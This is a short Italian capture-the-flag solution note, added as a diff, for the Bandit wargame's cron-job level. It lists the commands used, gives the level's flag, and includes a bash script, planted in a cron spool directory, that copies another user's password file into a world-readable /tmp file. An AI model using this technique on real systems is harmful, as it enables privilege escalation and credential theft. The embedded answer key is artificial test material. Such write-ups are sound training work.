@@ -1,0 +1,27 @@
+Soluzione:
+
+	--> cat /etc/cron.d/cronjob_bandit24
+	--> cat /usr/bin/cronjob_bandit24.sh
+	--> (creazione dello script "/var/spool/bandit24/foo/readpsw.sh")
+	--> chmod 777 /var/spool/bandit24/foo/readpsw.sh
+	--> cat /tmp/asdrubalebarca/psw.txt {nome della cartella arbitrario; specificato nello script}
+
+Flag: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+
+<-----<-----< Script >----->----->
+
+	#!/bin/bash
+
+	target="bandit24"
+
+	# Non riesce a scrivere sulla home di bandit23
+	path="/tmp/asdrubalebarca"
+
+	echo "Reading and saving file content..."
+
+	mkdir $path
+	touch $path/psw.txt		# Crea il file
+	chmod 666 $path/psw.txt	# Aggiunge i permessi di lettura e scrittura
+
+	cat /etc/bandit_pass/$target > $path/psw.txt
